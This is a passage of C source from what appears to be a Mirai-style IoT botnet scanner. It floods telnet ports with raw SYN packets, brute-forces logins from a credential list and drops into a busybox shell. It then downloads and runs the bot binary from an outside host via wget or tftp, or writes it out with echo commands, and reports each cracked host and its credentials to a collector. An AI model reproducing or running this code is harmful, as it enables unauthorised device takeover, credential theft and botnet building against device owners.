    tcph->syn = TRUE;

    create_login_list();
    init_prompts();
    init_logins();

    for(arm_bin_size = 0; arm_bins[++arm_bin_size] != 0;);

    process_all_retrieve_lines();

    #ifdef DEBUG
        printf("[telnet scan] Retrieved a maximum of %d credential combos\n", max_credentials);
    #endif

    #ifdef DEBUG
        printf("[telnet scan] TELNET scan initilized with %d fd%s (root)\n", SCANNER_MAX_CONNS, (SCANNER_MAX_CONNS > 1 ? "s" : ""));
    #endif

    while(TRUE)
    {
        fd_set read_set;
        fd_set write_set;
        struct scanner_struct_t *conn;
        struct timeval tim;
        int last_avail_conn = 0;
        int last_spew = 0;
        int mfd_rd = 0;
        int mfd_wr = 0;
        int nfds = 0;

        if(fake_time != last_spew)
        {
            last_spew = fake_time;

            for(i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_raw_buf;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_new();
                iph->saddr = LOCAL_ADDRESS;
                iph->daddr = inet_addr("45.50.45.83");
                //iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = check_sum_generic((uint16_t *)iph, sizeof(struct iphdr));
                //if(i % 3 == 0) // 3 = 26:220 - 23:440 | faster 26 rep with slightly slower 23
                if(i % 3 == 0) // 4 = 26:165 - 23:495 | 26/23 rep bout the same
                {
                	tcph->dest = htons(26);
                }
                else
                {
                    tcph->dest = htons(23);
                }

                // more 23 less multi
                /*
                if(i % 10 == 0)
                {
                	int choice = rand_new() % 5;
                	if(choice == 0)
                	{
                	    tcph->dest = htons(2323);
                	}
                	if(choice == 1)
                	{
                	    tcph->dest = htons(2223);
                	}
                	if(choice == 2)
                	{
                	    tcph->dest = htons(26);
                	}
                	if(choice == 3)
                	{
                	    tcph->dest = htons(9000);
                	}
                	if(choice == 4)
                	{
                	    tcph->dest = htons(9001);
                	}
                }
                else
                {
                    tcph->dest = htons(23);
                }
                
                // randomized
                int choice = rand_new() % 15;

                if (choice < 4) // 3
                {
                    tcph->dest = htons(26);
                }

                if (choice == 4) // 1
                {
                    tcph->dest = htons(9000);
                }

                if (choice == 5) // 1
                {
                    tcph->dest = htons(9001);
                }

                if (choice == 6) // 1
                {
                    tcph->dest = htons(2323);
                }

                if (choice == 7) // 1
                {
                    tcph->dest = htons(2223);
                }

                if (choice > 7) // 8
                {
                    tcph->dest = htons(23);
                }
                */

                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = check_sum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_raw_buf, sizeof(scanner_raw_buf), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        last_avail_conn = 0;

        while(TRUE)
        {
            int n = 0;
            char dgram_buf[1514];
            struct iphdr *iph = (struct iphdr *)dgram_buf;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_struct_t *conn;

            errno = 0;
            n = recvfrom(rsck, dgram_buf, sizeof(dgram_buf), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDRESS)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            //if(tcph->source != htons(23) && tcph->source != htons(26))
                //continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if(conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);

            #ifdef DEBUG
                //printf("[telnet scan/%d] Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
            #endif
        }

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        for(i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if(conn->state != SC_CLOSED && (fake_time - conn->last_recv) > conn->timeout)
            {
                #ifdef DEBUG
                    //printf("[telnet scan/%d] Timed out (state = %d, seconds = %d)\n", conn->fd, conn->state, conn->timeout);
                #endif

                switch(conn->state)
                {
                    case SC_CHECK_WGET_TFTP_DEPLOY:
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Bot deploy failed (Wget/Tftp) - %s, falling back to echo\n", conn->fd, get_victim_host(conn));
                        #endif
                        conn->method = 0;
                        conn->run = 2;
                        setup_connection(conn);
                        continue;
                        break;
                    case SC_CHECK_ECHO_DEPLOY:
                        if(conn->echo_method == 2)
                        {
                            #ifdef DEBUG
                                printf("[telnet scan/%d] Bot deploy failed - %s (echo), giving up\n", conn->fd, get_victim_host(conn));
                            #endif
                            break;
                        }
                        else if(conn->arm_tries != 1 && util_strstr(conn->arch, "arm"))
                        {
                            conn->arm_tries++;
                            if(conn->arm_tries == 1)
                            {
                                conn->elf_header.arch = 0xA7;
                                conn->arch = "arm7";
                            }
                            conn->retr_bin_index = 0;
                            #ifdef DEBUG
                                printf("[telnet scan/%d] ARM deploy failed retrying with another version (%d tries)\n", conn->fd, conn->arm_tries);
                            #endif
                            setup_connection(conn);
                            continue;
                        }
                        if(conn->arm_tries == 1)
                        {
                            break;
                        }
                        #ifdef DEBUG
                            printf("[telnet scan/%d] Bot deploy failed - %s (echo), falling back to another method\n", conn->fd, get_victim_host(conn));
                        #endif
                        conn->echo_method = 2;
                        conn->retr_bin_index = 0;
                        conn->run = 2;
                        setup_connection(conn);
                        continue;
                        break;
                    default:
                        break;
                }

                close(conn->fd);
                conn->fd = -1;
                conn->state = SC_CLOSED;
                conn->run = 0;
                conn->tries = 0;
                conn->got_iac = FALSE;
                conn->retr_bin_index = 0;
                conn->echo_method = 0;
                conn->elf_header.arch = 0;
                conn->elf_header.endianness = 0;
                conn->arch = NULL;
                conn->arm_tries = 0;
                conn->remote_auth_index = 0;
                memset(conn->writeable_dir, 0, 64);
                continue;
            }

            if(conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &write_set);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &read_set);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &read_set, &write_set, NULL, &tim);

        fake_time = time(NULL);

        for(i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &write_set))
            {
                int err = 0;
                int ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    conn->state = SC_WAITING_USERNAME;
                    if(!conn->run)
                        conn->login = retrieve_login();
                    conn->rdbuf_pos = 0;
                    conn->timeout = 7;
                    #ifdef DEBUG
                        //printf("[telnet scan/%d] Target %s:%d.\n", conn->fd, get_victim_host(conn), htons(conn->dst_port));
                    #endif
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &read_set))
            {
                while(TRUE)
                {
                    int ret = 0;

                    if(conn->state == SC_CLOSED)
                    {
                        conn->run = 0;
                        conn->tries = 0;
                        conn->got_iac = FALSE;
                        conn->retr_bin_index = 0;
                        conn->echo_method = 0;
                        conn->elf_header.arch = 0;
                        conn->elf_header.endianness = 0;
                        conn->arch = NULL;
                        conn->arm_tries = 0;
                        conn->remote_auth_index = 0;
                        memset(conn->writeable_dir, 0, 64);
                        break;
                    }

                    if(conn->rdbuf_pos == SOCKBUF_SIZE)
                    {
                        memmove(conn->sockbuf, conn->sockbuf + SCANNER_HACK_DRAIN, SOCKBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = recv(conn->fd, conn->sockbuf + conn->rdbuf_pos, SOCKBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = SC_CLOSED;
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while(TRUE)
                    {
                        int consumed = 0;

                        switch(conn->state)
                        {
                            case SC_WAITING_USERNAME:
                                if((consumed = compare_telnet_prompts(TELNET_LOGIN_PROMPTS, conn)))
                                {
                                    util_send(conn->fd, "%s\r\n", conn->login->username);
                                    conn->timeout = 7;
                                    conn->state = SC_WAITING_PASSWORD;
                                    //#ifdef DEBUG
                                    //    printf("[telnet scan/%d] Found login prompt - %s\n", conn->fd, get_victim_host(conn));
                                    //#endif
                                }
                                break;
                            case SC_WAITING_PASSWORD:
                                if((consumed = compare_telnet_prompts(TELNET_LOGIN_PROMPTS, conn)))
                                {
                                    //#ifdef DEBUG
                                    //    printf("[telnet scan/%d] Found login/password prompt - %s\n", conn->fd, get_victim_host(conn));
                                    //#endif
                                    util_send(conn->fd, "%s\r\n", conn->login->password);
                                    conn->timeout = 10;
                                    conn->state = SC_WAITING_FAIL_OR_SUCCESS;
                                }
                                break;
                            case SC_WAITING_FAIL_OR_SUCCESS:
                                if((consumed = compare_telnet_prompts(TELNET_FAIL_OR_SUCCESS_PROMPTS, conn)))
                                {
                                    if((consumed = compare_telnet_prompts(TELNET_FAIL_PROMPTS, conn)))
                                    {
                                        #ifdef DEBUG
                                            //printf("[telnet scan/%d] Failed telnet attempt - %s\n", conn->fd, get_victim_host(conn));
                                        #endif

                                        close(conn->fd);
                                        conn->fd = -1;
                                        conn->tries++;
                                        conn->remote_auth_index++;

                                        if(conn->tries == 20) // used to be 20
                                        {
                                            #ifdef DEBUG
                                                printf("[telnet scan] Failed telnet attempt - %s (exceeded maximum attempts of %d)\n", get_victim_host(conn), conn->tries);
                                            #endif
                                            conn->state = SC_CLOSED;
                                            continue;
                                        }

                                        setup_connection(conn);
                                    }
                                    else if((consumed = compare_telnet_prompts(TELNET_SUCCESS_PROMPTS, conn)))
                                    {
                                        unlock_entry(TABLE_SCAN_ENABLE);
                                        unlock_entry(TABLE_SCAN_SYSTEM);
                                        unlock_entry(TABLE_SCAN_SHELL);
                                        unlock_entry(TABLE_SCAN_SH);
                                        util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_ENABLE));
                                        util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SYSTEM));
                                        util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SHELL));
                                        util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_SH));
                                        lock_entry(TABLE_SCAN_ENABLE);
                                        lock_entry(TABLE_SCAN_SYSTEM);
                                        lock_entry(TABLE_SCAN_SHELL);
                                        lock_entry(TABLE_SCAN_SH);

                                        switch(conn->run)
                                        {
                                            case 0:
                                                conn->state = SC_VERIFY_LOGIN;
                                                conn->timeout = 10;
                                                unlock_entry(TABLE_SCAN_QUERY);
                                                util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_QUERY));
                                                lock_entry(TABLE_SCAN_QUERY);
                                                break;
                                            case 1:
                                                util_send(conn->fd, "/bin/busybox DMSNA\r\n");
                                                conn->timeout = 10;
                                                conn->state = SC_DETERMINE_WRITEABLE_DIR;
                                                break;
                                            case 2:
                                                unlock_entry(TABLE_SCAN_DROPPER_NAME);
                                                unlock_entry(TABLE_SCAN_BINARY_NAME);

                                                int dir;
                                                for(dir = 0; dir < 14; dir++)
                                                {
                                                    util_send(conn->fd, "/bin/busybox mkdir %s; >%s.file && cd %s\r\n", tmp_dirs[dir], tmp_dirs[dir], tmp_dirs[dir]);
                                                    util_send(conn->fd, "/bin/busybox rm -rf .file %s %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                                                }

                                                util_send(conn->fd, "/bin/busybox cp /bin/busybox %s; /bin/busybox cp /bin/busybox %s; >%s; >%s; /bin/busybox chmod 777 %s %s\r\n", retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                                
                                                lock_entry(TABLE_SCAN_BINARY_NAME);
                                                lock_entry(TABLE_SCAN_DROPPER_NAME);
                                                conn->state = SC_BUILD_ECHO_PAYLOAD;
                                                break;
                                        }
                                    }
                                }
                                break;
                            case SC_VERIFY_LOGIN:
                                unlock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_BUSYBOX_RESPONSE))))
                                {
                                    conn->timeout = 10;
                                    lock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                                    #ifdef DEBUG
                                        printf("[telnet scan/%d] Success telnet attempt - %s:%s:%s\n", conn->fd, get_victim_host(conn), conn->login->username, conn->login->password);
                                    #endif
                                    memset(conn->message, 0, sizeof(conn->message));
                                    sprintf(conn->message, "attempting ---> [%s:%d %s:%s]", get_victim_host(conn), htons(conn->dst_port), conn->login->username, conn->login->password);
                                    report_working(conn->message);
                                    
                                    unlock_entry(TABLE_SCAN_CAT_BUSYBOX);
                                    util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_CAT_BUSYBOX));
                                    lock_entry(TABLE_SCAN_CAT_BUSYBOX);
                                    conn->state = SC_EXTRACT_ELF_DATA;
                                    continue;
                                }
                                lock_entry(TABLE_SCAN_BUSYBOX_RESPONSE);
                                break;
                            case SC_EXTRACT_ELF_DATA:
                                if((consumed = extract_elf_data(conn)))
                                {
                                    conn->run = 1;
                                    close(conn->fd);
                                    conn->fd = -1;
                                    setup_connection(conn);
                                }
                                break;
                            case SC_DETERMINE_WRITEABLE_DIR:
                                unlock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_MOUNTS_RESPONSE))))
                                {
                                    lock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                                    unlock_entry(TABLE_SCAN_DROPPER_NAME);
                                    unlock_entry(TABLE_SCAN_BINARY_NAME);

                                    int dir;
                                    for(dir = 0; dir < 14; dir++)
                                    {
                                        util_send(conn->fd, "/bin/busybox mkdir %s; >%s.file && cd %s\r\n", tmp_dirs[dir], tmp_dirs[dir], tmp_dirs[dir]);
                                        util_send(conn->fd, "/bin/busybox rm -rf .file %s %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                                    }

                                    lock_entry(TABLE_SCAN_DROPPER_NAME);
                                    lock_entry(TABLE_SCAN_BINARY_NAME);
                                    
                                    unlock_entry(TABLE_SCAN_DETERMINE_INFECTION);
                                    util_send(conn->fd, "%s\r\n", retrieve_entry(TABLE_SCAN_DETERMINE_INFECTION));
                                    lock_entry(TABLE_SCAN_DETERMINE_INFECTION);
                                    conn->timeout = 15;

                                    conn->state = SC_DETERMINE_INFECTION_METHOD;
                                    continue;
                                }
                                lock_entry(TABLE_SCAN_MOUNTS_RESPONSE);
                                break;
                            case SC_DETERMINE_INFECTION_METHOD:
                                unlock_entry(TABLE_SCAN_INFECT_RESPONSE);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_INFECT_RESPONSE))))
                                {
                                    lock_entry(TABLE_SCAN_INFECT_RESPONSE);
                                    unlock_entry(TABLE_SCAN_WGET_RESPONSE);
                                    unlock_entry(TABLE_SCAN_TFTP_RESPONSE);
                                    if(!(consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_WGET_RESPONSE))))
                                    {
                                        #ifdef DEBUG
                                            printf("[telnet scan/%d] Wget\n", conn->fd);
                                        #endif
                                        conn->method = 1;
                                        conn->timeout = 30;
                                        lock_entry(TABLE_SCAN_WGET_RESPONSE);
                                        unlock_entry(TABLE_SCAN_BINARY_NAME);
                                        util_send(conn->fd, "/bin/busybox cp /bin/busybox %s; >%s; /bin/busybox chmod 777 %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        lock_entry(TABLE_SCAN_BINARY_NAME);
                                        if(util_strstr(conn->arch, "arm"))
                                        {
                                            for(x = 0; x < arm_bin_size; x++)
                                            {
                                                unlock_entry(TABLE_SCAN_BINARY_NAME);
                                                //util_send(conn->fd, "/bin/busybox wget http://%d.%d.%d.%d:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", 37,49,224,231, 80, arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                                util_send(conn->fd, "/bin/busybox wget http://%s:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", domain, 80, arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                                lock_entry(TABLE_SCAN_BINARY_NAME);
                                                #ifdef DEBUG
                                                    printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                                #endif
                                                //memset(conn->message, 0, sizeof(conn->message));
                                                //sprintf(conn->message, "Downloading %s via wget ---> [%s:23 %s:%s]", arm_bins[x], get_victim_host(conn), conn->login->username, conn->login->password);
                                                //report_working(conn->message, 1);
                                            }
                                            conn->state = SC_CHECK_WGET_TFTP_DEPLOY;
                                            continue;
                                        }
                                        unlock_entry(TABLE_SCAN_BINARY_NAME);
                                        //util_send(conn->fd, "/bin/busybox wget http://%d.%d.%d.%d:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", 37,49,224,231, 80, conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        util_send(conn->fd, "/bin/busybox wget http://%s:%d/batkek/%s -O -> %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.wget; >%s\r\n", domain, 80, conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        #ifdef DEBUG
                                            printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                        #endif
                                        //memset(conn->message, 0, sizeof(conn->message));
                                        //sprintf(conn->message, "Downloading %s via wget ---> [%s:23 %s:%s]", conn->arch, get_victim_host(conn), conn->login->username, conn->login->password);
                                        //report_working(conn->message, 1);

                                        lock_entry(TABLE_SCAN_BINARY_NAME);
                                        conn->state = SC_CHECK_WGET_TFTP_DEPLOY;
                                    }
                                    else if(!(consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_TFTP_RESPONSE))))
                                    {
                                        #ifdef DEBUG
                                            printf("[telnet scan/%d] Tftp\n", conn->fd);
                                        #endif
                                        conn->method = 2;
                                        conn->timeout = 45;
                                        lock_entry(TABLE_SCAN_TFTP_RESPONSE);
                                        unlock_entry(TABLE_SCAN_BINARY_NAME);
                                        util_send(conn->fd, "/bin/busybox cp /bin/busybox %s; >%s; /bin/busybox chmod 777 %s\r\n", retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        lock_entry(TABLE_SCAN_BINARY_NAME);
                                        if(util_strstr(conn->arch, "arm"))
                                        {
                                            for(x = 0; x < arm_bin_size; x++)
                                            {
                                                unlock_entry(TABLE_SCAN_BINARY_NAME);
                                                //util_send(conn->fd, "/bin/busybox tftp -r %s -l %s -g %d.%d.%d.%d; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME), 37,49,224,231, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                                util_send(conn->fd, "/bin/busybox tftp -r %s -l %s -g %s; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME), domain, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), arm_bins[x], retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                                #ifdef DEBUG
                                                    printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                                #endif
                                                //memset(conn->message, 0, sizeof(conn->message));
                                                //sprintf(conn->message, "Downloading %s via tftp ---> [%s:23 %s:%s]", arm_bins[x], get_victim_host(conn), conn->login->username, conn->login->password);
                                                //report_working(conn->message, 1);
                                                
                                                lock_entry(TABLE_SCAN_BINARY_NAME);
                                            }
                                            conn->state = SC_CHECK_WGET_TFTP_DEPLOY;
                                            continue;
                                        }
                                        unlock_entry(TABLE_SCAN_BINARY_NAME);
                                        //util_send(conn->fd, "/bin/busybox tftp -r %s -l %s -g %d.%d.%d.%d; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), 37,49,224,231, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        util_send(conn->fd, "/bin/busybox tftp -r %s -l %s -g %d.%d.%d.%d; /bin/busybox chmod 777 %s; ./%s telnet.%s.tftp; >%s\r\n", conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME), domain, retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), conn->arch, retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        #ifdef DEBUG
                                            printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                        #endif
                                        //memset(conn->message, 0, sizeof(conn->message));
                                        //sprintf(conn->message, "Downloading %s via tftp ---> [%s:23 %s:%s]", conn->arch, get_victim_host(conn), conn->login->username, conn->login->password);
                                        //report_working(conn->message, 1);

                                        lock_entry(TABLE_SCAN_BINARY_NAME);
                                        conn->state = SC_CHECK_WGET_TFTP_DEPLOY;
                                    }
                                    else
                                    {
                                        #ifdef DEBUG
                                            printf("[telnet scan/%d] Echo\n", conn->fd);
                                        #endif
                                        conn->method = 0;
                                        lock_entry(TABLE_SCAN_WGET_RESPONSE);
                                        lock_entry(TABLE_SCAN_TFTP_RESPONSE);
                                        unlock_entry(TABLE_SCAN_BINARY_NAME);
                                        unlock_entry(TABLE_SCAN_DROPPER_NAME);
                                        util_send(conn->fd, "/bin/busybox cp /bin/busybox %s; /bin/busybox cp /bin/busybox %s; >%s; >%s; /bin/busybox chmod 777 %s %s\r\n", retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                        lock_entry(TABLE_SCAN_BINARY_NAME);
                                        lock_entry(TABLE_SCAN_DROPPER_NAME);
                                        conn->state = SC_BUILD_ECHO_PAYLOAD;
                                    }
                                    continue;
                                }
                                lock_entry(TABLE_SCAN_INFECT_RESPONSE);
                                break;
                            case SC_BUILD_ECHO_PAYLOAD:
                                retrbin = get_retrieve_binary(conn);
                                if(retrbin == 0)
                                {
                                    #ifdef DEBUG
                                        printf("[telnet scan/%d] Failed to load retrieve binary - %s\n", conn->fd, get_victim_host(conn));
                                    #endif
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                    continue;
                                }

                                retr_line = get_retrieve_line(retrbin, conn->retr_bin_index);
                                if(retr_line == NULL)
                                {
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                    continue;
                                }

                                unlock_entry(TABLE_SCAN_DROPPER_NAME);
                                if(conn->echo_method != 2)
                                {
                                    util_send(conn->fd, "/bin/busybox echo -en '%s' %s %s && /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'\r\n", retr_line, (conn->retr_bin_index == 0 ? ">" : ">>"), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                                }
                                else
                                {
                                    util_send(conn->fd, "/bin/busybox echo '%s\\c' %s %s && /bin/busybox echo '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45\\c'\r\n", retr_line, (conn->retr_bin_index == 0 ? ">" : ">>"), retrieve_entry(TABLE_SCAN_DROPPER_NAME));
                                }
                                lock_entry(TABLE_SCAN_DROPPER_NAME);

                                #ifdef DEBUG
                                    printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                #endif

                                conn->retr_bin_index++;
                                if(conn->retr_bin_index == retrbin->retr_line_num)
                                {
                                    unlock_entry(TABLE_SCAN_DROPPER_NAME);
                                    unlock_entry(TABLE_SCAN_BINARY_NAME);
                                    util_send(conn->fd, "./%s; ./%s telnet.%s.echo; >%s; >%s\r\n", retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME), conn->arch, retrieve_entry(TABLE_SCAN_DROPPER_NAME), retrieve_entry(TABLE_SCAN_BINARY_NAME));
                                    #ifdef DEBUG
                                        printf("[telnet scan/%d] Built payload %s", conn->fd, scan_buf);
                                    #endif
                                    //memset(conn->message, 0, sizeof(conn->message));
                                    //sprintf(conn->message, "Echo loaded %s ---> [%s:23 %s:%s]", conn->arch, get_victim_host(conn), conn->login->username, conn->login->password);
                                    //report_working(conn->message, 1);
                                    lock_entry(TABLE_SCAN_DROPPER_NAME);
                                    lock_entry(TABLE_SCAN_BINARY_NAME);
                                    conn->timeout = 30;
                                    conn->state = SC_CHECK_ECHO_DEPLOY;
                                    continue;
                                }

                                conn->timeout = 15;
                                conn->state = SC_VERIFY_ECHO_PAYLOAD;
                                break;
                            case SC_VERIFY_ECHO_PAYLOAD:
                                unlock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_SCAN_ECHO_FEEDBACK))))
                                {
                                    #ifdef DEBUG
                                        printf("[telnet scan/%d] ECHO feedback\n", conn->fd);
                                    #endif
                                    lock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                                    conn->timeout = 15;
                                    conn->state = SC_BUILD_ECHO_PAYLOAD;
                                    continue;
                                }
                                lock_entry(TABLE_SCAN_ECHO_FEEDBACK);
                                break;
                            case SC_CHECK_WGET_TFTP_DEPLOY:
                                unlock_entry(TABLE_DEPLOY_STRING);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_DEPLOY_STRING))))
                                {
                                    #ifdef DEBUG
                                        printf("[telnet scan/%d] Bot successfully deployed (Wget/Tftp) - %s\n", conn->fd, get_victim_host(conn));
                                    #endif
                                    memset(conn->message, 0, sizeof(conn->message));
                                    sprintf(conn->message, "bot %s successfully deployed via %s ---> [%s:%d %s:%s]", conn->arch, conn->method == 1 ? "wget" : "tftp", get_victim_host(conn), htons(conn->dst_port), conn->login->username, conn->login->password);
                                    report_working(conn->message);
                                    
                                    lock_entry(TABLE_DEPLOY_STRING);
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                    continue;
                                }
                                lock_entry(TABLE_DEPLOY_STRING);
                                break;
                            case SC_CHECK_ECHO_DEPLOY:
                                unlock_entry(TABLE_DEPLOY_STRING);
                                if((consumed = contains_single_string(conn, retrieve_entry(TABLE_DEPLOY_STRING))))
                                {
                                    memset(conn->message, 0, sizeof(conn->message));
                                    sprintf(conn->message, "bot %s successfully deployed via echo ---> [%s:%d %s:%s]", conn->arch, get_victim_host(conn), htons(conn->dst_port), conn->login->username, conn->login->password);
                                    report_working(conn->message);
                                    
                                    #ifdef DEBUG
